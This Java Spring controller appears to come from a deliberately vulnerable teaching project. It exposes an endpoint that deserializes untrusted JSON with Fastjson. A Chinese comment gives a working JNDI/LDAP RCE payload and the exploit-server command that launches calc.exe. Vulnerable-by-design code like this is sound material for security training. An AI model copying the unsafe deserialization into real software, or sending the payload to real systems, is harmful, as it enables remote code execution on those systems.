package com.example.vulnerablejava.controller;

import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;

@Api(tags = "Fastjson RCE 漏洞")
@RestController
@RequestMapping("fastjson")
public class FastjsonController {

    /**
     * 存在Fastjson RCE漏洞，攻击者发送如下数据，即可执行命令
     * {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/1dus4n","autoCommit":true}
     *
     * 开启ldap server: java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A "127.0.0.1"
     */
    @ApiOperation("存在漏洞")
    @PostMapping("1")
    public String read(@RequestBody String json) {
        Object parse = JSON.parse(json);
        return parse.toString();
    }
}
